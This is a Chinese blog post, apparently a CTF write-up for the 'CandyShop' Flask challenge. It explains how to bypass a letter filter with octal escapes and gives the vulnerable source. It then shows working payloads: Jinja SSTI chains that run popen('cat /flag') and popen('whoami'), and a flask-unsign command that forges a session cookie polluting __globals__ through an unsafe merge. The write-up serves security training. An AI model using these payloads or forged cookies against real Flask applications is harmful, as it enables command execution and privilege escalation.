# 京津冀 长城杯 CandyShop

  
  
&lt;!--more--&gt;  
## Bypass 字母限制  
在`Python`中可以通过`\163`来表示一个字母  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409090000134.png)
  
贴一个转换的脚本  
```python  
exp = &#34;&#39;&#39;.__class__&#34;  
dicc = []  
exploit = &#34;&#34;  
for i in range(256):  
    eval(&#34;dicc.append(&#39;{}&#39;)&#34;.format(&#34;\\&#34;&#43;str(i)))  
print(dicc)  
for i in exp:  
    exploit &#43;= &#34;\\\\&#34;&#43; str(dicc.index(i))  
  
print(exploit)  
```  
启一个`flask demo`  
```python  
from flask import Flask,request,render_template_string  
app = Flask(__name__)  
  
@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def index():  
    name = request.args.get(&#39;name&#39;)  
    template = &#39;&#39;&#39;  
&lt;html&gt;  
  &lt;head&gt;  
    &lt;title&gt;SSTI&lt;/title&gt;  
  &lt;/head&gt;  
 &lt;body&gt;  
      &lt;h3&gt;Hello, %s !&lt;/h3&gt;  
  &lt;/body&gt;  
&lt;/html&gt;  
        &#39;&#39;&#39;% (name)  
    return render_template_string(template)  
if __name__ == &#34;__main__&#34;:  
    app.run(host=&#34;0.0.0.0&#34;, port=5000, debug=True)  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409090007953.png)
构造一个完整的`payload`  
```python  
{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;popen&#39;](&#39;cat /flag&#39;).read()}}  
  
{{&#34;&#34;[&#39;\137\137\143\154\141\163\163\137\137&#39;][&#39;\137\137\142\141\163\145\163\137\137&#39;][0][&#39;\137\137\163\165\142\143\154\141\163\163\145\163\137\137&#39;]()[132][&#39;\137\137\151\156\151\164\137\137&#39;][&#39;\137\137\147\154\157\142\141\154\163\137\137&#39;][&#39;\160\157\160\145\156&#39;](&#39;\167\150\157\141\155\151&#39;)[&#39;\162\145\141\144&#39;]()}}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409090017465.png)
## CandyShop  
了解了这个之后，再来看代码  
```python  
import datetime  
from flask import Flask, render_template, render_template_string, request, redirect, url_for, session, make_response  
from wtforms import StringField, PasswordField, SubmitField  
from wtforms.validators import DataRequired, Length  
from flask_wtf import FlaskForm  
import re  
  
  
app = Flask(__name__)  
  
app.config[&#39;SECRET_KEY&#39;] = &#39;a123456&#39;  
  
class RegistrationForm(FlaskForm):  
    username = StringField(&#39;Username&#39;, validators=[DataRequired(), Length(min=2, max=20)])  
    password = PasswordField(&#39;Password&#39;, validators=[DataRequired(), Length(min=6, max=20)])  
    submit = SubmitField(&#39;Register&#39;)  
      
class LoginForm(FlaskForm):  
    username = StringField(&#39;Username&#39;, validators=[DataRequired(), Length(min=2, max=20)])  
    password = PasswordField(&#39;Password&#39;, validators=[DataRequired(), Length(min=6, max=20)])  
    submit = SubmitField(&#39;Login&#39;)  
  
class Candy:  
    def __init__(self, name, image):  
        self.name = name  
        self.image = image  
  
class User:  
    def __init__(self, username, password):  
        self.username = username  
        self.password = password  
  
    def verify_password(self, username, password):  
        return (self.username==username) &amp; (self.password==password)  
class Admin:  
    def __init__(self):  
        self.username = &#34;&#34;  
        self.identity = &#34;&#34;  
  
def sanitize_inventory_sold(value):  
    return re.sub(r&#39;[a-zA-Z_]&#39;, &#39;&#39;, str(value))  
def merge(src, dst):  
    for k, v in src.items():  
        if hasattr(dst, &#39;__getitem__&#39;):  
            if dst.get(k) and type(v) == dict:  
                merge(v, dst.get(k))  
            else:  
                dst[k] = v  
        elif hasattr(dst, k) and type(v) == dict:  
            merge(v, getattr(dst, k))  
        else:  
            setattr(dst, k, v)  
  
candies = [Candy(name=&#34;Lollipop&#34;, image=&#34;images/candy1.jpg&#34;),  
    Candy(name=&#34;Chocolate Bar&#34;, image=&#34;images/candy2.jpg&#34;),  
    Candy(name=&#34;Gummy Bears&#34;, image=&#34;images/candy3.jpg&#34;)  
]  
users = []  
admin_user = []  
@app.route(&#39;/register&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def register():  
    form = RegistrationForm()  
    if form.validate_on_submit():  
        user = User(username=form.username.data, password=form.password.data)  
        users.append(user)  
        return redirect(url_for(&#39;login&#39;))  
      
    return render_template(&#39;register.html&#39;, form=form)  
  
@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def login():  
    form = LoginForm()  
    if form.validate_on_submit():  
        for u in users:  
            if u.verify_password(form.username.data, form.password.data):  
                session[&#39;username&#39;] = form.username.data  
                session[&#39;identity&#39;] = &#34;guest&#34;  
                return redirect(url_for(&#39;home&#39;))  
      
    return render_template(&#39;login.html&#39;, form=form)  
  
inventory = 500  
sold = 0  
@app.route(&#39;/home&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def home():  
    global inventory, sold  
    message = None  
    username = session.get(&#39;username&#39;)  
    identity = session.get(&#39;identity&#39;)  
  
    if not username:  
        return redirect(url_for(&#39;register&#39;))  
      
    if sold &gt;= 10 and sold &lt; 500:  
        sold = 0  
        inventory = 500  
        message = &#34;But you have bought too many candies!&#34;  
        return render_template(&#39;home.html&#39;, inventory=inventory, sold=sold, message=message, candies=candies)  
  
    if request.method == &#39;POST&#39;:  
        action = request.form.get(&#39;action&#39;)  
        if action == &#34;buy_candy&#34;:  
            if inventory &gt; 0:  
                inventory -= 3  
                sold &#43;= 3  
            if inventory == 0:  
                message = &#34;All candies are sold out!&#34;  
            if sold &gt;= 500:  
                with open(&#39;secret.txt&#39;, &#39;r&#39;) as file:  
                    message = file.read()  
  
    return render_template(&#39;home.html&#39;, inventory=inventory, sold=sold, message=message, candies=candies)  
  
  
@app.route(&#39;/admin&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def admin():  
    username = session.get(&#39;username&#39;)  
    identity = session.get(&#39;identity&#39;)  
    if not username or identity != &#39;admin&#39;:  
        return redirect(url_for(&#39;register&#39;))  
    admin = Admin()  
    merge(session,admin)  
    admin_user.append(admin)  
    return render_template(&#39;admin.html&#39;, view=&#39;index&#39;)  
  
@app.route(&#39;/admin/view_candies&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def view_candies():  
    username = session.get(&#39;username&#39;)  
    identity = session.get(&#39;identity&#39;)  
    if not username or identity != &#39;admin&#39;:  
        return redirect(url_for(&#39;register&#39;))  
    return render_template(&#39;admin.html&#39;, view=&#39;candies&#39;, candies=candies)  
  
@app.route(&#39;/admin/add_candy&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def add_candy():  
    username = session.get(&#39;username&#39;)  
    identity = session.get(&#39;identity&#39;)  
    if not username or identity != &#39;admin&#39;:  
        return redirect(url_for(&#39;register&#39;))  
    candy_name = request.form.get(&#39;name&#39;)  
    candy_image = request.form.get(&#39;image&#39;)  
    if candy_name and candy_image:  
        new_candy = Candy(name=candy_name, image=candy_image)  
        candies.append(new_candy)  
    return render_template(&#39;admin.html&#39;, view=&#39;add_candy&#39;)  
  
@app.route(&#39;/admin/view_inventory&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def view_inventory():  
    username = session.get(&#39;username&#39;)  
    identity = session.get(&#39;identity&#39;)  
    if not username or identity != &#39;admin&#39;:  
        return redirect(url_for(&#39;register&#39;))  
    inventory_value = sanitize_inventory_sold(inventory)  
    sold_value = sanitize_inventory_sold(sold)  
    return render_template_string(&#34;商店库存:&#34; &#43; inventory_value &#43; &#34;已售出&#34; &#43; sold_value)  
  
@app.route(&#39;/admin/add_inventory&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def add_inventory():  
    global inventory  
    username = session.get(&#39;username&#39;)  
    identity = session.get(&#39;identity&#39;)  
    if not username or identity != &#39;admin&#39;:  
        return redirect(url_for(&#39;register&#39;))  
    if request.form.get(&#39;add&#39;):  
        num = request.form.get(&#39;add&#39;)  
        inventory &#43;= int(num)  
    return render_template(&#39;admin.html&#39;, view=&#39;add_inventory&#39;)  
  
@app.route(&#39;/&#39;)  
def index():  
    return render_template(&#39;index.html&#39;)  
  
if __name__ == &#39;__main__&#39;:  
    app.run(debug=False, host=&#39;0.0.0.0&#39;, port=1337)  
```  
通读一遍，通过`flask-unsign`爆破得到`secret key`为`a123456`，本地复现时需要设置一下  
通过`/admin`处，可以造成`Python`原形链污染  
```python  
@app.route(&#39;/admin&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])  
def admin():  
    username = session.get(&#39;username&#39;)  
    identity = session.get(&#39;identity&#39;)  
    if not username or identity != &#39;admin&#39;:  
        return redirect(url_for(&#39;register&#39;))  
    admin = Admin()  
    merge(session,admin)  
    admin_user.append(admin)  
    return render_template(&#39;admin.html&#39;, view=&#39;index&#39;)  
```  
构造`payload`来进行绕过权限认证  
`{&#39;identity&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;}`  
接着在`/admin/view_inventory`处存在`SSTI`，而绕过字母限制，正是上面所讲的内容  
直接构造`payload`  
```python  
{&#39;identity&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;,&#39;__init__&#39;:{&#39;__globals__&#39;:{&#39;sold&#39;:&#39;{{\&#39;\&#39;[\&#39;\\137\\137\\143\\154\\141\\163\\163\\137\\137\&#39;][\&#39;\\137\\137\\142\\141\\163\\145\\163\\137\\137\&#39;][0][\&#39;\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\&#39;]()[132][\&#39;\\137\\137\\151\\156\\151\\164\\137\\137\&#39;][\&#39;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\&#39;][\&#39;\\160\\157\\160\\145\\156\&#39;](\&#39;\\167\\150\\157\\141\\155\\151\&#39;)[\&#39;\\162\\145\\141\\144\&#39;]()}}&#39;}}}  
```  
因为在终端执行的`flask-unsign --sign`，并且利用了双引号包裹，所以还需加`\\`才能转义`\\`，最终`payload`  
```python  
{&#39;identity&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;,&#39;__init__&#39;:{&#39;__globals__&#39;:{&#39;sold&#39;:&#39;{{\&#39;\&#39;[\&#39;\\\\137\\\\137\\\\143\\\\154\\\\141\\\\163\\\\163\\\\137\\\\137\&#39;][\&#39;\\\\137\\\\137\\\\142\\\\141\\\\163\\\\145\\\\163\\\\137\\\\137\&#39;][0][\&#39;\\\\137\\\\137\\\\163\\\\165\\\\142\\\\143\\\\154\\\\141\\\\163\\\\163\\\\145\\\\163\\\\137\\\\137\&#39;]()[132][\&#39;\\\\137\\\\137\\\\151\\\\156\\\\151\\\\164\\\\137\\\\137\&#39;][\&#39;\\\\137\\\\137\\\\147\\\\154\\\\157\\\\142\\\\141\\\\154\\\\163\\\\137\\\\137\&#39;][\&#39;\\\\160\\\\157\\\\160\\\\145\\\\156\&#39;](\&#39;\\\\167\\\\150\\\\157\\\\141\\\\155\\\\151\&#39;)[\&#39;\\\\162\\\\145\\\\141\\\\144\&#39;]()}}&#39;}}}  
  
flask-unsign --sign --cookie &#34;{&#39;identity&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;,&#39;__init__&#39;:{&#39;__globals__&#39;:{&#39;sold&#39;:&#39;{{\&#39;\&#39;[\&#39;\\\\137\\\\137\\\\143\\\\154\\\\141\\\\163\\\\163\\\\137\\\\137\&#39;][\&#39;\\\\137\\\\137\\\\142\\\\141\\\\163\\\\145\\\\163\\\\137\\\\137\&#39;][0][\&#39;\\\\137\\\\137\\\\163\\\\165\\\\142\\\\143\\\\154\\\\141\\\\163\\\\163\\\\145\\\\163\\\\137\\\\137\&#39;]()[132][\&#39;\\\\137\\\\137\\\\151\\\\156\\\\151\\\\164\\\\137\\\\137\&#39;][\&#39;\\\\137\\\\137\\\\147\\\\154\\\\157\\\\142\\\\141\\\\154\\\\163\\\\137\\\\137\&#39;][\&#39;\\\\160\\\\157\\\\160\\\\145\\\\156\&#39;](\&#39;\\\\167\\\\150\\\\157\\\\141\\\\155\\\\151\&#39;)[\&#39;\\\\162\\\\145\\\\141\\\\144\&#39;]()}}&#39;}}}&#34; --secret &#39;a123456&#39;  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202409090112370.png)

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/%E4%BA%AC%E6%B4%A5%E5%86%80-%E9%95%BF%E5%9F%8E%E6%9D%AF-candyshop/  

